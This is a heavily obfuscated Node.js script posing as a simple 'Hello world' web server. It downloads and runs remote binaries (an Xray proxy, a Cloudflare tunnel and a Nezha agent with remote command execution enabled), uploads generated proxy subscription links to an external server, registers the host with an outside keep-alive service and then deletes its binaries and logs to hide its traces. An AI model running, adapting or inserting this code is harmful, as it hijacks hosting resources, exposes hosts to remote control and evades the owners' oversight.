const _0x245351=_0x4300;(function(_0xa45f6f,_0x593ed7){const _0x5322c6=_0x4300,_0xcb5ad4=_0xa45f6f();while(!![]){try{const _0x2d84a7=-parseInt(_0x5322c6(0x27e))/0x1+parseInt(_0x5322c6(0x269))/0x2*(parseInt(_0x5322c6(0x241))/0x3)+-parseInt(_0x5322c6(0x290))/0x4*(parseInt(_0x5322c6(0x25e))/0x5)+parseInt(_0x5322c6(0x21b))/0x6+parseInt(_0x5322c6(0x271))/0x7+-parseInt(_0x5322c6(0x268))/0x8*(parseInt(_0x5322c6(0x295))/0x9)+parseInt(_0x5322c6(0x1e3))/0xa;if(_0x2d84a7===_0x593ed7)break;else _0xcb5ad4['push'](_0xcb5ad4['shift']());}catch(_0x26bd37){_0xcb5ad4['push'](_0xcb5ad4['shift']());}}}(_0x3973,0x96915));const express=require(_0x245351(0x202)),app=express(),axios=require(_0x245351(0x233)),os=require('os'),fs=require('fs'),path=require(_0x245351(0x225)),{promisify}=require(_0x245351(0x22c)),exec=promisify(require(_0x245351(0x1ee))[_0x245351(0x208)]),{execSync}=require(_0x245351(0x1ee)),UPLOAD_URL=process[_0x245351(0x250)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x245351(0x250)][_0x245351(0x22f)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x245351(0x250)]['FILE_PATH']||_0x245351(0x22a),SUB_PATH=process[_0x245351(0x250)][_0x245351(0x287)]||_0x245351(0x220),PORT=process[_0x245351(0x250)][_0x245351(0x27d)]||process[_0x245351(0x250)][_0x245351(0x1f5)]||0xbb8,UUID=process[_0x245351(0x250)][_0x245351(0x1e9)]||'957963af-d92b-401f-a9fa-c987981d6bc6',NEZHA_SERVER=process['env'][_0x245351(0x216)]||'',NEZHA_PORT=process[_0x245351(0x250)][_0x245351(0x1e5)]||'',NEZHA_KEY=process[_0x245351(0x250)][_0x245351(0x228)]||'',ARGO_DOMAIN=process['env'][_0x245351(0x22b)]||'',ARGO_AUTH=process['env']['ARGO_AUTH']||'',ARGO_PORT=process[_0x245351(0x250)]['ARGO_PORT']||0x1f41,CFIP=process[_0x245351(0x250)][_0x245351(0x20b)]||_0x245351(0x224),CFPORT=process['env'][_0x245351(0x213)]||0x1bb,NAME=process[_0x245351(0x250)]['NAME']||_0x245351(0x293);!fs[_0x245351(0x20f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x245351(0x264)](FILE_PATH+'\x20is\x20created')):console[_0x245351(0x264)](FILE_PATH+_0x245351(0x20d));let npmPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x20c)),phpPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x26d)),webPath=path[_0x245351(0x238)](FILE_PATH,'web'),botPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x255)),subPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x246)),listPath=path['join'](FILE_PATH,_0x245351(0x1f6)),bootLogPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x232)),configPath=path[_0x245351(0x238)](FILE_PATH,_0x245351(0x1d8));function deleteNodes(){const _0x354027=_0x245351;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x439b14;try{_0x439b14=fs[_0x354027(0x21e)](subPath,'utf-8');}catch{return null;}const _0x3f49ce=Buffer[_0x354027(0x205)](_0x439b14,_0x354027(0x24c))[_0x354027(0x1fc)]('utf-8'),_0x106456=_0x3f49ce[_0x354027(0x1e4)]('\x0a')[_0x354027(0x23c)](_0x4aa39f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x354027(0x289)](_0x4aa39f));if(_0x106456[_0x354027(0x201)]===0x0)return;return axios[_0x354027(0x276)](UPLOAD_URL+_0x354027(0x256),JSON[_0x354027(0x20a)]({'nodes':_0x106456}),{'headers':{'Content-Type':'application/json'}})[_0x354027(0x261)](_0x292ed7=>{return null;});}catch(_0x59df8e){return null;}}function cleanupOldFiles(){const _0x168f33=_0x245351,_0x2ec609=[_0x168f33(0x25c),'bot',_0x168f33(0x20c),_0x168f33(0x26d),_0x168f33(0x246),'boot.log'];_0x2ec609['forEach'](_0x5c583d=>{const _0xe5456f=path['join'](FILE_PATH,_0x5c583d);fs['unlink'](_0xe5456f,()=>{});});}app[_0x245351(0x222)]('/',function(_0x5d9f64,_0x528002){const _0x58a85e=_0x245351;_0x528002[_0x58a85e(0x207)](_0x58a85e(0x27f));});const config={'log':{'access':_0x245351(0x249),'error':_0x245351(0x249),'loglevel':_0x245351(0x28c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x245351(0x1f3),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x245351(0x28c),'fallbacks':[{'dest':0xbb9},{'path':_0x245351(0x23b),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x245351(0x267),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x245351(0x28c)},'streamSettings':{'network':_0x245351(0x294),'security':_0x245351(0x28c)}},{'port':0xbba,'listen':_0x245351(0x227),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x245351(0x28c)},'streamSettings':{'network':'ws','security':_0x245351(0x28c),'wsSettings':{'path':_0x245351(0x23b)}},'sniffing':{'enabled':![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x245351(0x227),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':![],'destOverride':['http','tls',_0x245351(0x1e1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x245351(0x227),'protocol':_0x245351(0x1ed),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x245351(0x28c),'wsSettings':{'path':_0x245351(0x267)}},'sniffing':{'enabled':![],'destOverride':[_0x245351(0x1fd),_0x245351(0x235),_0x245351(0x1e1)],'metadataOnly':![]}}],'dns':{'servers':[_0x245351(0x219)]},'outbounds':[{'protocol':_0x245351(0x1f1),'tag':'direct'},{'protocol':_0x245351(0x212),'tag':'block'}]};fs['writeFileSync'](path[_0x245351(0x238)](FILE_PATH,_0x245351(0x1d8)),JSON[_0x245351(0x20a)](config,null,0x2));function getSystemArchitecture(){const _0x107422=_0x245351,_0x2984cb=os[_0x107422(0x25b)]();return _0x2984cb===_0x107422(0x288)||_0x2984cb===_0x107422(0x23a)||_0x2984cb===_0x107422(0x206)?_0x107422(0x288):'amd';}function downloadFile(_0x32fad2,_0x34ed31,_0x3c65a5){const _0x235641=_0x245351,_0x1ef46e=path['join'](FILE_PATH,_0x32fad2),_0x27fa1f=fs[_0x235641(0x209)](_0x1ef46e);axios({'method':_0x235641(0x222),'url':_0x34ed31,'responseType':_0x235641(0x262)})[_0x235641(0x274)](_0x48fd1f=>{const _0x4f946b=_0x235641;_0x48fd1f[_0x4f946b(0x266)][_0x4f946b(0x22e)](_0x27fa1f),_0x27fa1f['on'](_0x4f946b(0x28b),()=>{const _0x118f03=_0x4f946b;_0x27fa1f[_0x118f03(0x1f4)](),console[_0x118f03(0x264)]('Download\x20'+_0x32fad2+_0x118f03(0x28a)),_0x3c65a5(null,_0x32fad2);}),_0x27fa1f['on'](_0x4f946b(0x263),_0x232996=>{const _0x46855f=_0x4f946b;fs[_0x46855f(0x27a)](_0x1ef46e,()=>{});const _0x2b8f0f=_0x46855f(0x244)+_0x32fad2+_0x46855f(0x277)+_0x232996['message'];console[_0x46855f(0x263)](_0x2b8f0f),_0x3c65a5(_0x2b8f0f);});})['catch'](_0x233df3=>{const _0x201916=_0x235641,_0x2f70fb='Download\x20'+_0x32fad2+_0x201916(0x277)+_0x233df3['message'];console['error'](_0x2f70fb),_0x3c65a5(_0x2f70fb);});}async function downloadFilesAndRun(){const _0x2629fd=_0x245351,_0x58e31d=getSystemArchitecture(),_0x21d05f=getFilesForArchitecture(_0x58e31d);if(_0x21d05f[_0x2629fd(0x201)]===0x0){console['log'](_0x2629fd(0x221));return;}const _0x362e24=_0x21d05f[_0x2629fd(0x1ec)](_0x5d7df7=>{return new Promise((_0x3d1511,_0x5af3b8)=>{const _0x1997ca=_0x4300;downloadFile(_0x5d7df7[_0x1997ca(0x1e2)],_0x5d7df7[_0x1997ca(0x203)],(_0x4d888a,_0x9d7637)=>{_0x4d888a?_0x5af3b8(_0x4d888a):_0x3d1511(_0x9d7637);});});});try{await Promise['all'](_0x362e24);}catch(_0x188314){console[_0x2629fd(0x263)](_0x2629fd(0x21f),_0x188314);return;}function _0x4867ad(_0x3a9e13){const _0x1fb989=0x1fd;_0x3a9e13['forEach'](_0x4be861=>{const _0x25d276=_0x4300,_0x380c39=path[_0x25d276(0x238)](FILE_PATH,_0x4be861);fs['existsSync'](_0x380c39)&&fs[_0x25d276(0x1eb)](_0x380c39,_0x1fb989,_0x1ae679=>{const _0x238445=_0x25d276;_0x1ae679?console['error'](_0x238445(0x25a)+_0x380c39+':\x20'+_0x1ae679):console[_0x238445(0x264)]('Empowerment\x20success\x20for\x20'+_0x380c39+':\x20'+_0x1fb989[_0x238445(0x1fc)](0x8));});});}const _0x6b25c6=NEZHA_PORT?[_0x2629fd(0x1fa),_0x2629fd(0x26a),_0x2629fd(0x284)]:[_0x2629fd(0x215),_0x2629fd(0x26a),_0x2629fd(0x284)];_0x4867ad(_0x6b25c6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x240b41=NEZHA_SERVER[_0x2629fd(0x240)](':')?NEZHA_SERVER[_0x2629fd(0x1e4)](':')[_0x2629fd(0x204)]():'',_0x469891=new Set([_0x2629fd(0x24a),'8443',_0x2629fd(0x24d),_0x2629fd(0x265),'2083',_0x2629fd(0x28f)]),_0x39b089=_0x469891[_0x2629fd(0x1dc)](_0x240b41)?_0x2629fd(0x23f):_0x2629fd(0x239),_0x4cfb83='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2629fd(0x1f8)+NEZHA_SERVER+_0x2629fd(0x28d)+_0x39b089+_0x2629fd(0x25d)+UUID;fs[_0x2629fd(0x281)](path[_0x2629fd(0x238)](FILE_PATH,_0x2629fd(0x230)),_0x4cfb83);const _0x2a9b66='nohup\x20'+FILE_PATH+_0x2629fd(0x242)+FILE_PATH+_0x2629fd(0x218);try{await exec(_0x2a9b66),console[_0x2629fd(0x264)](_0x2629fd(0x257)),await new Promise(_0x107a59=>setTimeout(_0x107a59,0x3e8));}catch(_0x11b785){console[_0x2629fd(0x263)](_0x2629fd(0x26b)+_0x11b785);}}else{let _0x4263bc='';const _0x28f90d=['443',_0x2629fd(0x1f2),_0x2629fd(0x24d),_0x2629fd(0x265),'2083',_0x2629fd(0x28f)];_0x28f90d[_0x2629fd(0x240)](NEZHA_PORT)&&(_0x4263bc=_0x2629fd(0x22d));const _0x2fec04=_0x2629fd(0x258)+FILE_PATH+_0x2629fd(0x286)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2629fd(0x259)+NEZHA_KEY+'\x20'+_0x4263bc+_0x2629fd(0x270);try{await exec(_0x2fec04),console[_0x2629fd(0x264)]('npm\x20is\x20running'),await new Promise(_0x4e6410=>setTimeout(_0x4e6410,0x3e8));}catch(_0x577fef){console[_0x2629fd(0x263)](_0x2629fd(0x25f)+_0x577fef);}}}else console[_0x2629fd(0x264)](_0x2629fd(0x275));const _0xdfdc5a=_0x2629fd(0x258)+FILE_PATH+_0x2629fd(0x1e6)+FILE_PATH+_0x2629fd(0x1f0);try{await exec(_0xdfdc5a),console[_0x2629fd(0x264)](_0x2629fd(0x21d)),await new Promise(_0x21611c=>setTimeout(_0x21611c,0x3e8));}catch(_0x1d9260){console['error'](_0x2629fd(0x1d9)+_0x1d9260);}if(fs[_0x2629fd(0x20f)](path[_0x2629fd(0x238)](FILE_PATH,_0x2629fd(0x255)))){let _0x32fb16;if(ARGO_AUTH[_0x2629fd(0x229)](/^[A-Z0-9a-z=]{120,250}$/))_0x32fb16=_0x2629fd(0x251)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x32fb16=_0x2629fd(0x278)+FILE_PATH+_0x2629fd(0x253):_0x32fb16=_0x2629fd(0x26c)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x2629fd(0x258)+FILE_PATH+_0x2629fd(0x200)+_0x32fb16+_0x2629fd(0x270)),console[_0x2629fd(0x264)](_0x2629fd(0x23d)),await new Promise(_0x20a7b3=>setTimeout(_0x20a7b3,0x7d0));}catch(_0x85986f){console[_0x2629fd(0x263)](_0x2629fd(0x1f9)+_0x85986f);}}await new Promise(_0x283bb5=>setTimeout(_0x283bb5,0x1388));}function getFilesForArchitecture(_0x1b20bb){const _0x494a5a=_0x245351;let _0x4ba007;_0x1b20bb===_0x494a5a(0x288)?_0x4ba007=[{'fileName':_0x494a5a(0x25c),'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0x494a5a(0x27c)}]:_0x4ba007=[{'fileName':_0x494a5a(0x25c),'fileUrl':_0x494a5a(0x237)},{'fileName':_0x494a5a(0x255),'fileUrl':_0x494a5a(0x226)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1f42ce=_0x1b20bb===_0x494a5a(0x288)?_0x494a5a(0x23e):_0x494a5a(0x1ea);_0x4ba007['unshift']({'fileName':_0x494a5a(0x20c),'fileUrl':_0x1f42ce});}else{const _0x520e85=_0x1b20bb===_0x494a5a(0x288)?'https://arm64.ssss.nyc.mn/v1':_0x494a5a(0x254);_0x4ba007[_0x494a5a(0x291)]({'fileName':_0x494a5a(0x26d),'fileUrl':_0x520e85});}}return _0x4ba007;}function argoType(){const _0x14e7a0=_0x245351;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x14e7a0(0x264)](_0x14e7a0(0x210));return;}if(ARGO_AUTH['includes'](_0x14e7a0(0x243))){fs[_0x14e7a0(0x281)](path[_0x14e7a0(0x238)](FILE_PATH,_0x14e7a0(0x1de)),ARGO_AUTH);const _0x1f7b1e=_0x14e7a0(0x1e8)+ARGO_AUTH[_0x14e7a0(0x1e4)]('\x22')[0xb]+_0x14e7a0(0x26f)+path['join'](FILE_PATH,_0x14e7a0(0x1de))+_0x14e7a0(0x1ef)+ARGO_DOMAIN+_0x14e7a0(0x1e7)+ARGO_PORT+_0x14e7a0(0x1ff);fs[_0x14e7a0(0x281)](path[_0x14e7a0(0x238)](FILE_PATH,_0x14e7a0(0x272)),_0x1f7b1e);}else console[_0x14e7a0(0x264)](_0x14e7a0(0x279));}argoType();function _0x3973(){const _0x24b08c=['CFPORT','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','./php','NEZHA_SERVER','response','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https+local://8.8.8.8/dns-query','application/json','1653054ghwkCB','ARGO_DOMAIN:','web\x20is\x20running','readFileSync','Error\x20downloading\x20files:','sub','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','get','unlinkSync','www.visa.com.sg','path','https://amd64.ssss.nyc.mn/2go','127.0.0.1','NEZHA_KEY','match','./tmp','ARGO_DOMAIN','util','--tls','pipe','PROJECT_URL','config.yaml','utf-8','boot.log','axios','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tls','/vmess-argo?ed=2560','https://amd64.ssss.nyc.mn/web','join','false','arm64','/vless-argo','filter','bot\x20is\x20running','https://arm64.ssss.nyc.mn/agent','true','includes','3sWZUZD','/php\x20-c\x20\x22','TunnelSecret','Download\x20','automatic\x20access\x20task\x20added\x20successfully','sub.txt','\x0a\x20\x20\x0avmess://','Skipping\x20adding\x20automatic\x20access\x20task','/dev/null','443','Error\x20reading\x20boot.log:','base64','2096','push','clear','env','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/v1','bot','/api/delete-nodes','php\x20is\x20running','nohup\x20','\x20-p\x20','Empowerment\x20failed\x20for\x20','arch','web','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','971195Hqkeem','npm\x20running\x20error:\x20','App\x20is\x20running','catch','stream','error','log','2087','data','/trojan-argo','8cyeSag','1378334yNxOLS','./web','php\x20running\x20error:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','php','status','\x0a\x20\x20credentials-file:\x20','\x20>/dev/null\x202>&1\x20&','4208498qksevp','tunnel.yml','text/plain;\x20charset=utf-8','then','NEZHA\x20variable\x20is\x20empty,skip\x20running','post','\x20failed:\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','unlink','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/2go','SERVER_PORT','175211uoADzI','Hello\x20world!','bot\x20is\x20running.','writeFileSync','forEach','set','./bot','Subscription\x20uploaded\x20successfully','/npm\x20-s\x20','SUB_PATH','arm','test','\x20successfully','finish','none','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','添加URL失败:\x20','2053','20gezvDb','unshift','/api/add-subscriptions','Vls','tcp','5561757nZMfnx','config.json','web\x20running\x20error:\x20','listen','/api/add-nodes','has','&type=ws&host=','tunnel.json','?encryption=none&security=tls&sni=','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','quic','fileName','8152140yciYDT','split','NEZHA_PORT','/web\x20-c\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x20\x20tunnel:\x20','UUID','https://amd64.ssss.nyc.mn/agent','chmod','map','trojan','child_process','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/config.json\x20>/dev/null\x202>&1\x20&','freedom','8443','vless','close','PORT','list.txt','message','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','Error\x20executing\x20command:\x20','./npm','ArgoDomain:','toString','http','\x0a\x20\x20\x0atrojan://','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/bot\x20','length','express','fileUrl','pop','from','aarch64','send','exec','createWriteStream','stringify','CFIP','npm','\x20already\x20exists','Content-Type','existsSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x0avless://','blackhole'];_0x3973=function(){return _0x24b08c;};return _0x3973();}async function extractDomains(){const _0x1f28f8=_0x245351;let _0x15e851;if(ARGO_AUTH&&ARGO_DOMAIN)_0x15e851=ARGO_DOMAIN,console[_0x1f28f8(0x264)](_0x1f28f8(0x21c),_0x15e851),await _0xadea41(_0x15e851);else try{const _0x4f904a=fs['readFileSync'](path[_0x1f28f8(0x238)](FILE_PATH,_0x1f28f8(0x232)),_0x1f28f8(0x231)),_0x179f6c=_0x4f904a[_0x1f28f8(0x1e4)]('\x0a'),_0x28bbbd=[];_0x179f6c[_0x1f28f8(0x282)](_0x541905=>{const _0x1ce7cd=_0x1f28f8,_0x2d0491=_0x541905[_0x1ce7cd(0x229)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2d0491){const _0x4e1eb6=_0x2d0491[0x1];_0x28bbbd[_0x1ce7cd(0x24e)](_0x4e1eb6);}});if(_0x28bbbd[_0x1f28f8(0x201)]>0x0)_0x15e851=_0x28bbbd[0x0],console['log'](_0x1f28f8(0x1fb),_0x15e851),await _0xadea41(_0x15e851);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x1f28f8(0x223)](path['join'](FILE_PATH,_0x1f28f8(0x232)));async function _0x1a248e(){try{await exec('pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1');}catch(_0x568d6b){}}_0x1a248e(),await new Promise(_0x1c202b=>setTimeout(_0x1c202b,0xbb8));const _0xe68c73=_0x1f28f8(0x26c)+FILE_PATH+_0x1f28f8(0x234)+ARGO_PORT;try{await exec(_0x1f28f8(0x258)+path[_0x1f28f8(0x238)](FILE_PATH,'bot')+'\x20'+_0xe68c73+_0x1f28f8(0x270)),console[_0x1f28f8(0x264)](_0x1f28f8(0x280)),await new Promise(_0x904678=>setTimeout(_0x904678,0xbb8)),await extractDomains();}catch(_0x135a74){console[_0x1f28f8(0x263)]('Error\x20executing\x20command:\x20'+_0x135a74);}}}catch(_0x1cc912){console[_0x1f28f8(0x263)](_0x1f28f8(0x24b),_0x1cc912);}async function _0xadea41(_0x4e4c50){const _0x26d3ee=_0x1f28f8,_0x44322b=execSync(_0x26d3ee(0x214),{'encoding':_0x26d3ee(0x231)}),_0x21000d=_0x44322b['trim']();return new Promise(_0x583603=>{setTimeout(()=>{const _0x622f1f=_0x4300,_0xea5258={'v':'2','ps':NAME+'-'+_0x21000d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x622f1f(0x28c),'net':'ws','type':_0x622f1f(0x28c),'host':_0x4e4c50,'path':_0x622f1f(0x236),'tls':'tls','sni':_0x4e4c50,'alpn':''},_0x5702fc=_0x622f1f(0x211)+UUID+'@'+CFIP+':'+CFPORT+_0x622f1f(0x1df)+_0x4e4c50+_0x622f1f(0x1dd)+_0x4e4c50+'&path=%2Fvless-argo%3Fed%3D2560#'+NAME+'-'+_0x21000d+_0x622f1f(0x247)+Buffer[_0x622f1f(0x205)](JSON[_0x622f1f(0x20a)](_0xea5258))[_0x622f1f(0x1fc)](_0x622f1f(0x24c))+_0x622f1f(0x1fe)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4e4c50+'&type=ws&host='+_0x4e4c50+_0x622f1f(0x252)+NAME+'-'+_0x21000d+'\x0a\x20\x20\x20\x20';console[_0x622f1f(0x264)](Buffer[_0x622f1f(0x205)](_0x5702fc)['toString'](_0x622f1f(0x24c))),fs['writeFileSync'](subPath,Buffer[_0x622f1f(0x205)](_0x5702fc)[_0x622f1f(0x1fc)]('base64')),console[_0x622f1f(0x264)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uplodNodes(),app[_0x622f1f(0x222)]('/'+SUB_PATH,(_0x1d7272,_0x4c5978)=>{const _0x14380e=_0x622f1f,_0x552c55=Buffer[_0x14380e(0x205)](_0x5702fc)['toString']('base64');_0x4c5978[_0x14380e(0x283)](_0x14380e(0x20e),_0x14380e(0x273)),_0x4c5978[_0x14380e(0x207)](_0x552c55);}),_0x583603(_0x5702fc);},0x7d0);});}}async function uplodNodes(){const _0x20bb37=_0x245351;if(UPLOAD_URL&&PROJECT_URL){const _0x2661ef=PROJECT_URL+'/'+SUB_PATH,_0x2d6624={'subscription':[_0x2661ef]};try{const _0xbf154f=await axios[_0x20bb37(0x276)](UPLOAD_URL+_0x20bb37(0x292),_0x2d6624,{'headers':{'Content-Type':'application/json'}});if(_0xbf154f[_0x20bb37(0x26e)]===0xc8)console['log'](_0x20bb37(0x285));else return null;}catch(_0x2ad1da){if(_0x2ad1da[_0x20bb37(0x217)]){if(_0x2ad1da[_0x20bb37(0x217)][_0x20bb37(0x26e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x20bb37(0x20f)](listPath))return;const _0x3317f7=fs[_0x20bb37(0x21e)](listPath,_0x20bb37(0x231)),_0x850b6=_0x3317f7[_0x20bb37(0x1e4)]('\x0a')['filter'](_0x9e4da2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x20bb37(0x289)](_0x9e4da2));if(_0x850b6['length']===0x0)return;const _0x4fa4c5=JSON['stringify']({'nodes':_0x850b6});try{await axios[_0x20bb37(0x276)](UPLOAD_URL+_0x20bb37(0x1db),_0x4fa4c5,{'headers':{'Content-Type':_0x20bb37(0x21a)}});if(response[_0x20bb37(0x26e)]===0xc8)console[_0x20bb37(0x264)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x2226d4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x57c09f=_0x4300,_0xc7869e=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xc7869e['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xc7869e[_0x57c09f(0x24e)](phpPath);exec('rm\x20-rf\x20'+_0xc7869e[_0x57c09f(0x238)]('\x20')+'\x20>/dev/null\x202>&1',_0x35507c=>{const _0x326a5a=_0x57c09f;console[_0x326a5a(0x24f)](),console[_0x326a5a(0x264)](_0x326a5a(0x260)),console[_0x326a5a(0x264)](_0x326a5a(0x1e0));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x11f518=_0x245351;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x11f518(0x264)](_0x11f518(0x248));return;}try{const _0x254c93=await axios['post'](_0x11f518(0x27b),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});console[_0x11f518(0x264)](_0x11f518(0x245));}catch(_0x3acb79){console[_0x11f518(0x263)](_0x11f518(0x28e)+_0x3acb79[_0x11f518(0x1f7)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}function _0x4300(_0x2cc016,_0x5398ff){const _0x39739b=_0x3973();return _0x4300=function(_0x430024,_0x890916){_0x430024=_0x430024-0x1d8;let _0x563d24=_0x39739b[_0x430024];return _0x563d24;},_0x4300(_0x2cc016,_0x5398ff);}startserver(),app[_0x245351(0x1da)](PORT,()=>console[_0x245351(0x264)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
